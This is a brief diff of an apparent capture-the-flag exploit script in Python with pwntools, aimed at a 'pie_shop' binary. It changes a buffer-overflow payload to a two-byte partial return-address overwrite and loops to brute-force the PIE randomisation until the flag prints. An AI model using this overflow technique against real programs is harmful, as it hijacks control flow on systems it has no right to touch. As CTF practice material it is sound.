@@ -21,7 +21,7 @@ while True:
       r = process('./pie_shop')
 
     r.recvuntil('What type of pie do you want?')
-    r.sendline('a' * (ret - stack) + p64(flag))
+    r.sendline('a' * (ret - stack) + '\xa9\x11')
     res = r.recvall(1)
     if (res != res_before and count) or 'actf{' in res:
       print res
